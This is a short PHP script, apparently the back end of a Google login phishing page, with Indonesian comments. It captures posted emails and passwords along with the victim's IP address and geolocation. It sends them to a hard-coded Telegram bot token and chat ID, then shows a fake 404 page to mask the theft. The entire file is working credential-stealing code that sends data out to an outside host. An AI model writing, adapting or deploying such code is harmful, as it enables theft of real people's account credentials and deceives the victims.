<?php
$botToken = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
$chatId = "8753510792";

$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'];
$pass = $_POST['password'];
$time = date('Y-m-d H:i:s');

// Ambil lokasi dari IP
$geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
$lokasi = $geo['city'] . ', ' . $geo['country'] . ' (' . $geo['isp'] . ')';

$pesan = "🎭 GOOGLE LOGIN\n";
$pesan .= "Waktu: $time\n";
$pesan .= "Email: $email\n";
$pesan .= "Password: $pass\n";
$pesan .= "IP: $ip\n";
$pesan .= "Lokasi: $lokasi\n";

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($pesan));

// Redirect ke 404
header("HTTP/1.0 404 Not Found");
echo "<h1>404 Not Found</h1><p>The requested URL was not found.</p>";
?>
